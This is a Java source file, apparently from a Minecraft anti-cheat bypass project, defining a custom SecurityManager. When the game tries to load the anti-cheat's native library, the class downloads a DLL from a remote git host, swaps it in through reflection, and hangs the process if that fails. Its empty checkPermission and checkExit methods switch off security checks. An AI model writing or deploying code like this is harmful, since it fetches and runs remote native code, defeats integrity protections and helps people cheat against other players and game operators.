package com.alphaautoleak;

import com.alphaautoleak.utils.ReflectUtilies;

import org.apache.commons.io.FileUtils;

import java.io.File;

import java.net.URL;
import java.security.Permission;

/**
 * @Auther: SnowFlake
 * @Date: 2022/1/30 01:36
 */
public class CustomSecurityManager extends SecurityManager{

    @Override
    public void checkLink(String lib) {
        if (lib.contains("catanticheatx"))
        {
            DynamicLoader.startLoader();
            try {
                File temp = File.createTempFile("vbchfgj",".tmp");
                temp.deleteOnExit();
                FileUtils.copyInputStreamToFile(new URL("https://alphaautoleak.coding.net/p/minecraft/d/antiCatAnticheat/git/raw/master/dll/luohuayu.dll?download=true").openStream(),temp);
                ReflectUtilies.modify(lib,temp.getAbsolutePath());
            }catch (Exception e)
            {
                while (true)
                {
                    try {
                        Thread.sleep(1000L);
                    } catch (InterruptedException ex) {
                    }
                }
            }
        }
    }



    @Override
    public void checkPermission(Permission perm) {
    }

    @Override
    public void checkExit(int status) {


    }

}
